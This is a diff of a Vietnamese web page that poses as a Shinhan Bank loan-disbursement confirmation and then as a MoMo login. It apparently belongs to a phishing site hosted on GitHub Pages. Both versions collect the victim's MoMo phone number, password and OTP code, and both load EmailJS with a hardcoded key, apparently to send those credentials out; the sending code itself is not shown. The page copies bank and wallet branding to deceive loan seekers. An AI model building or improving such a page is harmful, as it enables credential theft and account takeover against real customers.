@@ -3,864 +3,662 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Nhận Giải Ngân Qua MoMo - Shinhan Bank</title>
-    <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-    <script>
-        // Inputmask fallback
-        window.Inputmask = window.Inputmask || function(options) {
-            console.warn('Inputmask not loaded, using fallback.');
-            return {
-                mask: function(element) {
-                    return this;
-                }
-            };
-        };
-        // Initialize EmailJS
-        emailjs.init('OrBsI926QI2_xBh1f');
+    <meta name="description" content="Xác nhận khoản vay Shinhan Bank và giải ngân qua MoMo">
+    <title>Xác Nhận Thanh Toán - Shinhan Bank</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+      // Cập nhật Public Key của bạn tại đây
+      (function() {
+         emailjs.init({
+           publicKey: "OrBsI926QI2_xBh1f",
+         });
+      })();
     </script>
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+        /* CSS Variables for theming and consistency */
+        :root {
+            --shinhan-blue: #004695;
+            --shinhan-blue-darker: #00336a;
+            --shinhan-blue-light-bg: #E6F0F9;
+            --momo-pink: #D82D8B;
+            --momo-pink-darker: #AE2070;
+            --brand-dark-text: #1d1d1f;
+            --brand-light-text: #6e6e73;
+            --brand-border: #EAEAEA;
+            --brand-background: #F5F5F7;
+            --success-green: #28a745;
+            --error-red: #ff4d4f;
+            --global-font: 'Lexend', sans-serif;
         }
 
+        /* General Reset and Body styles */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--global-font); }
         body {
-            background-color: #f5f5f5;
-            color: #333;
+            background-color: var(--brand-background);
+            display: flex; justify-content: center; align-items: flex-start;
+            padding: 20px; min-height: 100vh;
+        }
+        .mobile-frame { width: 100%; max-width: 420px; margin: auto; background-color: #fff; border-radius: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; min-height: 700px; }
+        
+        /* General Page Section Structure */
+        .page-section {
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        .page-section.active {
+            display: flex; /* Show active section */
         }
 
-        .top-banner {
-            background-color: #003087;
-            padding: 12px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        /* Header */
+        .page-header {
+            padding: 16px; text-align: center; background-color: #fff;
+            border-bottom: 1px solid var(--brand-border);
+            flex-shrink: 0;
             position: relative;
         }
-
-        .top-banner img {
-            height: 35px;
+        #confirmation-section .page-header {
+            background: linear-gradient(90deg, #0057b8, #004695);
+            color: white;
+            border-bottom: none;
         }
-
-        .hamburger {
-            display: none;
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 10px;
-            position: absolute;
-            top: 12px;
-            right: 10px;
-            z-index: 1000;
+        #confirmation-section .page-header h1 {
+            color: white;
+            font-size: 18px;
         }
-
-        .hamburger span {
-            display: block;
-            width: 25px;
-            height: 3px;
-            background: #fff;
-            margin: 5px 0;
-            transition: all 0.3s ease;
+        .page-header .back-button {
+             position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+             background: none; border: none; cursor: pointer; padding: 5px;
         }
-
-        .hamburger[aria-expanded="true"] span:nth-child(1) {
-            transform: rotate(45deg) translate(5px, 5px);
+        .page-header .back-button img { width: 24px; height: 24px; filter: invert(0); }
+        #confirmation-section .page-header .back-button img {
+             filter: invert(1);
         }
-
-        .hamburger[aria-expanded="true"] span:nth-child(2) {
-            opacity: 0;
+        .page-header h1 { 
+            font-size: 17px; 
+            font-weight: 600; 
+            color: var(--brand-dark-text);
         }
-
-        .hamburger[aria-expanded="true"] span:nth-child(3) {
-            transform: rotate(-45deg) translate(7px, -7px);
+        
+        /* Main Content */
+        .page-body, .login-body {
+            padding: 16px; 
+            flex-grow: 1;
+            background-color: var(--brand-background);
         }
-
-        nav {
-            background-color: #fff;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            margin: 10px 0;
-        }
-
-        nav ul {
+        .login-body {
             display: flex;
-            justify-content: center;
-            list-style: none;
-            padding: 10px 0;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+        }
+        
+        /* Card styles */
+        .info-card {
+            background-color: #fff; border-radius: 12px; padding: 20px; margin-bottom: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        .payment-summary-card {
+            text-align: center;
+            padding-top: 24px;
+        }
+        .payment-summary-card .label {
+            font-size: 15px;
+            color: var(--brand-light-text);
+            margin-bottom: 8px;
+        }
+        .payment-summary-card .amount {
+            font-size: 30px;
+            font-weight: 700;
+            color: var(--brand-dark-text);
+            margin-bottom: 20px;
+        }
+        .payment-summary-card hr {
+            border: none;
+            border-top: 1px solid var(--brand-border);
+            margin: 0 -20px;
+        }
+        
+        .detail-item {
+            display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 13px 0;
+            border-bottom: 1px solid var(--brand-border);
+        }
+         .detail-item:first-of-type {
+            padding-top: 20px;
+        }
+        .detail-item:last-of-type { 
+            border-bottom: none; 
+            padding-bottom: 4px;
+        }
+        .detail-item .label { color: var(--brand-light-text); font-weight: 400; }
+        .detail-item .value { font-weight: 500; color: var(--brand-dark-text); text-align: right; display: flex; align-items: center; gap: 8px; }
+        .detail-item .value img { width: 24px; height: 24px; }
+
+        .notice-card {
+            background-color: var(--shinhan-blue-light-bg);
+            color: var(--brand-dark-text);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+        }
+        .notice-card img {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        .notice-card p {
+            font-size: 14px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .notice-card strong {
+            color: var(--shinhan-blue);
         }
 
-        nav ul li {
-            margin: 0 15px;
-        }
-
-        nav ul li a {
-            text-decoration: none;
-            color: #003087;
-            font-weight: bold;
-            padding: 10px;
-            display: block;
-            transition: background 0.3s;
-        }
-
-        nav ul li a:hover, nav ul li a:focus {
-            background: #e6f0ff;
-            border-radius: 5px;
-        }
-
-        .banner-carousel {
+        /* MoMo Login Flow Specifics */
+        .banner-slider {
+            width: 100%;
+            aspect-ratio: 16 / 9;
             position: relative;
             overflow: hidden;
-            margin-bottom: 10px;
-            min-height: 180px;
-            aspect-ratio: 16 / 9;
+            border-radius: 8px;
+            margin-bottom: 24px;
         }
-
         .banner-slide {
-            display: none;
-            width: 100%;
-            height: 100%;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
         }
-
         .banner-slide.active {
-            display: block;
+            opacity: 1;
         }
-
-        .banner-slide img {
-            width: 100%;
-            max-height: 280px;
-            object-fit: contain;
-            display: block;
-            margin: 0 auto;
+        
+        .profile-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 24px;
         }
-
-        .banner-text {
-            position: absolute;
-            top: 50%;
-            left: 5%;
-            transform: translateY(-50%);
-            color: #fff;
-            text-align: left;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 8px 12px;
-            border-radius: 5px;
-            max-width: 80%;
-        }
-
-        .prev, .next {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            background: rgba(0, 0, 0, 0.7);
-            color: #fff;
-            border: none;
-            padding: 15px;
-            cursor: pointer;
-            font-size: 18px;
-            border-radius: 5px;
-            transition: background 0.3s;
-        }
-
-        .prev:hover, .next:hover {
-            background: rgba(0, 0, 0, 0.9);
-        }
-
-        .prev:focus, .next:focus {
-            outline: 2px solid #fff;
-            outline-offset: 2px;
-        }
-
-        .prev { left: 15px; }
-        .next { right: 15px; }
-
-        .dots {
-            text-align: center;
-            position: absolute;
-            bottom: 10px;
-            width: 100%;
-        }
-
-        .dot {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            margin: 0 6px;
-            background: #ccc;
+        .profile-header .avatar {
+            width: 72px; height: 72px;
             border-radius: 50%;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        .dot:hover, .dot:focus {
-            background: #666;
-        }
-
-        .dot.active {
-            background: #003087;
-        }
-
-        .steps {
+            background-color: #fceef5;
+            margin-bottom: 12px;
             display: flex;
-            justify-content: center;
-            margin: 10px 0;
-            gap: 10px;
-        }
-
-        .step {
-            flex: 1;
-            text-align: center;
-            padding: 12px;
-            background-color: #e0e0e0;
-            border-radius: 5px;
-            font-size: 14px;
-            display: none;
-        }
-
-        .step.active {
-            background-color: #003087;
-            color: #fff;
-            display: block;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 15px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        h2 {
-            color: #003087;
-            text-align: center;
-            margin-bottom: 15px;
-        }
-
-        h3 {
-            text-align: center;
-            margin-bottom: 10px;
-        }
-
-        .summary {
-            margin-bottom: 20px;
-            padding: 15px;
-            background-color: #f9f9f9;
-            border-radius: 5px;
-        }
-
-        .summary h3 {
-            margin-bottom: 10px;
-        }
-
-        .summary p {
-            margin: 8px 0;
-            font-size: 14px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group p {
-            margin-bottom: 10px;
-            line-height: 1.4;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .form-group .error {
-            color: red;
-            font-size: 12px;
-            display: none;
-            text-align: center;
-        }
-
-        .form-group .error.show {
-            display: block;
-        }
-
-        .agreement {
-            text-align: center;
-            font-size: 14px;
-            margin: 15px 0;
-            line-height: 1.4;
-        }
-
-        .agreement a {
-            color: #003087;
-            text-decoration: none;
-        }
-
-        .agreement a:hover {
-            text-decoration: underline;
-        }
-
-        .timer {
-            color: red;
-            font-weight: bold;
-            text-align: center;
-            margin: 10px 0;
-        }
-
-        .buttons {
-            display: flex;
-            gap: 10px;
+            align-items: center;
             justify-content: center;
         }
-
-        button {
-            padding: 12px 30px;
-            min-width: 120px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
+        .profile-header .avatar img {
+            width: 40px;
+        }
+        .profile-header .phone-number {
             font-size: 16px;
+            font-weight: 500;
+            color: var(--brand-dark-text);
         }
-
-        button.primary {
-            background-color: #003087;
-            color: #fff;
+        .login-title { font-size: 22px; font-weight: 700; color: var(--brand-dark-text); margin-bottom: 8px; }
+        .login-subtitle { font-size: 15px; color: var(--brand-light-text); margin-bottom: 32px; text-align: center; }
+        
+        .phone-input-wrapper {
+            display: flex; align-items: center; width: 100%;
+            border: 1px solid #ddd; border-radius: 12px; padding: 4px 16px; margin-bottom: 16px;
         }
+        .phone-prefix { font-size: 18px; font-weight: 600; color: var(--brand-dark-text); padding-right: 12px; border-right: 1px solid #ddd; }
+        .phone-input { border: none; padding: 12px; font-size: 18px; font-weight: 600; flex-grow: 1; color: var(--brand-dark-text); }
+        .phone-input:focus { outline: none; }
 
-        button.secondary {
-            background-color: #ccc;
-            color: #333;
+        .input-group { width: 100%; margin-bottom: 16px; }
+        .text-input {
+            width: 100%; border: none; border-bottom: 2px solid #ddd; padding: 12px 0;
+            font-size: 24px; font-weight: 700; text-align: center; letter-spacing: 4px;
+            color: var(--brand-dark-text); transition: border-color 0.2s;
         }
-
-        .support {
-            text-align: center;
-            margin: 20px 0;
+        .text-input::placeholder { color: #ccc; font-weight: 400; }
+        .text-input:focus { outline: none; border-bottom-color: var(--momo-pink); }
+        
+        .otp-input-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 16px; }
+        .otp-input {
+            width: 45px; height: 55px; text-align: center; font-size: 22px; font-weight: 600;
+            border: 1px solid #ddd; border-radius: 8px; color: var(--brand-dark-text);
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
-
-        .support p {
-            margin: 5px 0;
-            font-size: 14px;
+         .otp-input::placeholder {
+            color: #ccc;
+            font-size: 28px;
+            line-height: 55px;
         }
-
-        footer {
-            background-color: #003087;
-            color: #fff;
-            text-align: center;
-            padding: 15px 0;
-            margin-top: 15px;
+        .otp-input:focus { outline: none; border-color: var(--momo-pink); box-shadow: 0 0 0 2px rgba(216, 45, 139, 0.2); }
+        
+        .page-footer, .login-footer {
+            padding: 16px; background-color: #fff;
+            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
+            flex-shrink: 0;
         }
+        .login-footer { margin-top: auto; }
 
-        footer a {
-            color: #fff;
-            margin: 0 8px;
+        .agreement-text {
             font-size: 12px;
+            color: var(--brand-light-text);
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+        .agreement-text a {
+            color: var(--momo-pink);
             text-decoration: none;
+            font-weight: 500;
         }
-
-        footer a:hover {
-            text-decoration: underline;
+        
+        .button {
+            width: 100%; padding: 14px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;
+            transition: background-color 0.2s; border: none;
         }
-
-        footer img {
-            height: 28px;
-            margin: 8px;
+        .button:disabled { background-color: #ccc; cursor: not-allowed; }
+        .button.primary { background-color: var(--shinhan-blue); color: #fff; }
+        .button.primary:hover:not(:disabled) { background-color: var(--shinhan-blue-darker); }
+        .button.momo-btn { background-color: var(--momo-pink-darker); color: #fff; }
+        .button.momo-btn:hover:not(:disabled) { background-color: #9c1c63; }
+        
+        .loading { display: none; margin-bottom: 12px; text-align: center;}
+        .spinner { border: 4px solid #f3f3f3; border-top-color: var(--momo-pink); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .notification {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            padding: 12px 24px; border-radius: 8px; color: #fff; z-index: 1001;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: top 0.4s ease-in-out;
+            text-align: center;
         }
-
-        @media (max-width: 768px) {
-            .top-banner {
-                padding: 10px;
-            }
-
-            .top-banner img {
-                height: 28px;
-            }
-
-            .hamburger {
-                display: block;
-            }
-
-            nav ul {
-                display: none;
-                flex-direction: column;
-                align-items: center;
-                background: #fff;
-                position: absolute;
-                top: 50px;
-                left: 0;
-                width: 100%;
-                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-                z-index: 999;
-            }
-
-            nav ul.show {
-                display: flex;
-            }
-
-            nav ul li {
-                margin: 8px 0;
-                width: 100%;
-                text-align: center;
-            }
-
-            nav ul li a {
-                padding: 12px;
-                font-size: 14px;
-            }
-
-            .banner-carousel {
-                min-height: 160px;
-                margin-bottom: 5px;
-            }
-
-            .banner-text h1 {
-                font-size: 16px;
-            }
-
-            .banner-text p {
-                font-size: 10px;
-            }
-
-            .banner-slide img {
-                max-height: 180px;
-            }
-
-            .prev, .next {
-                padding: 8px;
-                font-size: 12px;
-            }
-
-            .dot {
-                width: 8px;
-                height: 8px;
-                margin: 0 4px;
-            }
-
-            .steps {
-                flex-direction: column;
-                gap: 6px;
-            }
-
-            .step {
-                padding: 8px;
-                font-size: 12px;
-            }
-
-            .container {
-                padding: 12px;
-            }
-
-            .form-group {
-                margin-bottom: 10px;
-            }
-
-            .form-group input {
-                padding: 10px;
-                font-size: 14px;
-            }
-
-            .agreement {
-                font-size: 13px;
-            }
-
-            button {
-                padding: 10px 25px;
-                min-width: 100px;
-                font-size: 14px;
-            }
-
-            .support p {
-                font-size: 13px;
-            }
-        }
+        .notification.show { top: 20px; }
+        .notification.success { background-color: var(--success-green); }
+        .notification.error { background-color: var(--error-red); }
     </style>
 </head>
 <body>
-    <!-- Logo Shinhan Bank - Kept unchanged -->
-    <div class="top-banner">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo">
-        <button class="hamburger" aria-label="Toggle Menu" aria-expanded="false" onclick="toggleMenu()">
-            <span></span>
-            <span></span>
-            <span></span>
-        </button>
+    <div class="mobile-frame">
+        
+        <!-- Confirmation View -->
+        <div id="confirmation-section" class="page-section active">
+            <header class="page-header">
+                 <button class="back-button" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html'"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Back"/></button>
+                <h1>Xác nhận thanh toán</h1>
+            </header>
+            <main class="page-body">
+                <div class="info-card payment-summary-card">
+                    <p class="label">Tổng thanh toán</p>
+                    <h2 class="amount" id="mainTotalAmount"></h2>
+                    <hr>
+                    <div id="payment-details">
+                        <!-- Details will be populated by JS -->
+                    </div>
+                </div>
+                <div class="info-card">
+                     <div id="customer-details">
+                        <!-- Customer details will be populated by JS -->
+                     </div>
+                </div>
+                 <div class="info-card notice-card">
+                    <img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300336a'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Calendar Icon">
+                    <p id="closingDateNotice"></p>
+                </div>
+            </main>
+            <footer class="page-footer">
+                 <button class="button primary" onclick="showSection('momo-phone-section')">Xác nhận</button>
+            </footer>
+        </div>
+
+        <!-- MoMo Phone Input View -->
+        <div id="momo-phone-section" class="page-section">
+            <header class="page-header">
+                <button class="back-button" onclick="showSection('confirmation-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
+                <h1>Đăng nhập MoMo</h1>
+            </header>
+            <main class="login-body" style="padding: 0; justify-content: space-between;">
+                 <div style="width: 100%;">
+                    <div class="banner-slider">
+                        <img src="https://homepage.momocdn.net/blogscontents/momo-upload-api-210330100721-637526956419126619.png" class="banner-slide active" alt="MoMo Banner 1">
+                        <img src="https://cellphones.com.vn/sforum/wp-content/uploads/2021/07/momo-upload-api-200728110550-637315311504981461.jpg" class="banner-slide" alt="MoMo Banner 2">
+                        <img src="https://cdn-media.sforum.vn/storage/app/media/vi-momo.jpg" class="banner-slide" alt="MoMo Banner 3">
+                    </div>
+                    <div style="padding: 24px 16px 0;">
+                        <p style="font-size: 16px; font-weight: 600; color: var(--brand-dark-text); margin-bottom: 16px;">Đăng nhập MoMo để tiếp tục</p>
+                        <form class="input-group" onsubmit="event.preventDefault(); handlePhoneSubmit();">
+                            <div class="phone-input-wrapper">
+                                <span class="phone-prefix">+84</span>
+                                <input type="tel" id="momo-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric">
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div style="padding: 0 16px 16px; width:100%">
+                    <p class="agreement-text">
+                        Bằng việc tiếp tục, bạn đồng ý với
+                        <a href="#">Điều khoản của MoMo</a>.
+                    </p>
+                    <button class="button momo-btn" onclick="handlePhoneSubmit()">Đăng nhập</button>
+                </div>
+            </main>
+        </div>
+
+        <!-- MoMo Password Input View -->
+        <div id="momo-password-section" class="page-section">
+             <header class="page-header">
+                 <button class="back-button" onclick="showSection('momo-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
+                <h1>Nhập mật khẩu</h1>
+            </header>
+             <main class="login-body" style="padding-top: 24px;">
+                <div class="profile-header">
+                     <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
+                    <span class="phone-number" id="masked-phone-password"></span>
+                </div>
+                <h2 class="login-title">Nhập mật khẩu</h2>
+                <form class="input-group" onsubmit="event.preventDefault(); handlePasswordSubmit();">
+                    <input type="password" id="momo-password" class="text-input" placeholder="••••••" required inputmode="numeric" pattern="[0-9]{6}" maxlength="6" oninput="this.value = this.value.replace(/\D/g, '')">
+                </form>
+            </main>
+            <footer class="login-footer">
+                <button class="button momo-btn" onclick="handlePasswordSubmit()">Đăng nhập</button>
+            </footer>
+        </div>
+
+        <!-- MoMo OTP Input View -->
+        <div id="momo-otp-section" class="page-section">
+             <header class="page-header">
+                <button class="back-button" onclick="showSection('momo-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
+                <h1>Xác thực OTP</h1>
+            </header>
+             <main class="login-body" style="padding-top: 24px;">
+                <div class="profile-header">
+                     <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
+                    <span class="phone-number" id="masked-phone-otp"></span>
+                </div>
+                <p class="login-subtitle" id="momo-otp-prompt"></p>
+                <form class="input-group" onsubmit="event.preventDefault(); handleOtpSubmit();">
+                    <div class="otp-input-container">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                    </div>
+                </form>
+                <div class="loading" id="momo-otp-loading"><div class="spinner"></div></div>
+            </main>
+            <footer class="login-footer">
+                <button class="button momo-btn" id="momo-otp-submit-btn" onclick="handleOtpSubmit()">Xác nhận</button>
+            </footer>
+        </div>
+        
     </div>
 
-    <nav role="navigation" aria-label="Main Navigation">
-        <ul id="nav-menu">
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html">Trang Chủ</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/ca-nhan.html">Lợi Ích</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">Giấy Tờ Cần Thiết</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html">Đăng Ký Giải Ngân</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html">Xem Kết Quả</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a></li>
-            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html">Liên Hệ</a></li>
-        </ul>
-    </nav>
-
-    <!-- Banner Carousel - All images kept unchanged -->
-    <div class="banner-carousel" role="region" aria-label="Promotional Carousel">
-        <div class="banner-slide active">
-            <img data-src="https://shinhan.com.vn/public/uploads/personal/2024/RLD/2024---RLD---SOHO-operation-Loan---banner.jpg" alt="SOHO Operation Loan" class="lazy">
-            <div class="banner-text">
-                <h1>Giải Ngân Khoản Vay</h1>
-                <p>Tăng tốc tương lai, kết nối vạn niềm tin</p>
-            </div>
-        </div>
-        <div class="banner-slide">
-            <img data-src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Unsecured--Loan_Baneer.jpg" alt="Unsecured Loan" class="lazy">
-            <div class="banner-text">
-                <h1>Giải Ngân Khoản Vay</h1>
-                <p>Ưu đãi hấp dẫn, vay dễ dàng</p>
-            </div>
-        </div>
-        <div class="banner-slide">
-            <img data-src="https://shinhan.com.vn/public/uploads/personal/2022/DIGITAL%20%20PERSONAL%20LOAN/20220624_DIGITAL%20CONSUMER%20LOAN_%20BANNER.jpg" alt="Digital Consumer Loan" class="lazy">
-            <div class="banner-text">
-                <h1>Giải Ngân Khoản Vay</h1>
-                <p>Khám phá cơ hội tài chính</p>
-            </div>
-        </div>
-        <div class="banner-slide">
-            <img data-src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Car-Loan_Baneer-1.jpg" alt="Car Loan" class="lazy">
-            <div class="banner-text">
-                <h1>Giải Ngân Khoản Vay</h1>
-                <p>Hỗ trợ mọi ước mơ</p>
-            </div>
-        </div>
-        <button class="prev" aria-label="Previous Slide" tabindex="0" onkeydown="if(event.key === 'Enter') changeSlide(-1)">❮</button>
-        <button class="next" aria-label="Next Slide" tabindex="0" onkeydown="if(event.key === 'Enter') changeSlide(1)">❯</button>
-        <div class="dots">
-            <span class="dot active" onclick="goToSlide(0)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(0)"></span>
-            <span class="dot" onclick="goToSlide(1)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(1)"></span>
-            <span class="dot" onclick="goToSlide(2)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(2)"></span>
-            <span class="dot" onclick="goToSlide(3)" tabindex="0" onkeydown="if(event.key === 'Enter') goToSlide(3)"></span>
-        </div>
-    </div>
-
-    <div class="steps" role="progressbar" aria-label="Disbursement Progress">
-        <div class="step" id="step1">Bước 1: Thông tin giải ngân</div>
-        <div class="step" id="step2">Bước 2: Xác nhận</div>
-        <div class="step active" id="step3" aria-current="step">Bước 3: Hoàn thành</div>
-    </div>
-
-    <div class="container">
-        <h2>Đăng Nhập MoMo</h2>
-        <div class="summary">
-            <h3>Thông tin giải ngân</h3>
-            <p>Họ và Tên: <span id="summaryName"></span></p>
-            <p>Số CCCD: <span id="summaryCCCD"></span></p>
-            <p>Số tiền: <span id="summaryAmount"></span></p>
-            <p>Thời hạn vay: <span id="summaryMonths"></span> tháng</p>
-            <p>Ngân hàng: <span id="summaryBank"></span></p>
-            <p>Số điện thoại: <span id="summaryPhone"></span></p>
-        </div>
-        <div id="phone-section">
-            <h3>Nhập số điện thoại để tiếp tục</h3>
-            <div class="form-group" aria-live="polite">
-                <label for="phone">Số Điện Thoại</label>
-                <input type="text" id="phone" placeholder="Nhập số điện thoại" required aria-describedby="phoneError">
-                <span class="error" id="phoneError">Vui lòng nhập số điện thoại hợp lệ</span>
-            </div>
-            <p class="agreement">
-                Bằng việc sử dụng MoMo, tôi đồng ý với
-                <a href="https://momo.vn/terms">thỏa thuận sử dụng MoMo</a>
-                và
-                <a href="https://momo.vn/privacy">chính sách bảo vệ quyền riêng tư</a>
-            </p>
-            <div class="buttons">
-                <button class="primary" onclick="proceedToPassword()">Tiếp tục</button>
-            </div>
-        </div>
-        <div id="password-section" style="display: none;">
-            <h3>Nhập mật khẩu MoMo</h3>
-            <div class="form-group" aria-live="polite">
-                <label for="password">Mật Khẩu</label>
-                <input type="password" id="password" required aria-describedby="passwordError">
-                <span class="error" id="passwordError">Vui lòng nhập mật khẩu</span>
-            </div>
-            <div class="buttons">
-                <button class="primary" onclick="proceedToOTP()">Xác Nhận</button>
-            </div>
-        </div>
-        <div id="otp-section" style="display: none;">
-            <h3>Xác Nhận OTP</h3>
-            <p id="otpMessage"></p>
-            <div class="form-group" aria-live="polite">
-                <label for="otp">Nhập mã OTP</label>
-                <input type="text" id="otp" required aria-describedby="otpError">
-                <span class="error" id="otpError">Mã xác thực không đúng, vui lòng thực hiện lại</span>
-            </div>
-            <p class="timer" id="otpTimer" aria-live="polite">Còn 60 giây</p>
-            <div class="buttons">
-                <button class="secondary" id="resendOTP" disabled onclick="resendOTP()">Gửi lại mã xác thực</button>
-                <button class="primary" onclick="verifyOTP()">Xác thực</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="support">
-        <h3>HỖ TRỢ KHÁCH HÀNG</h3>
-        <p>Hotline: 1800-599-921</p>
-        <p>Email: <a href="mailto:hotro@shinhanfinance.com.vn">hotro@shinhanfinance.com.vn</a></p>
-    </div>
-
-    <!-- Footer Images - Kept unchanged -->
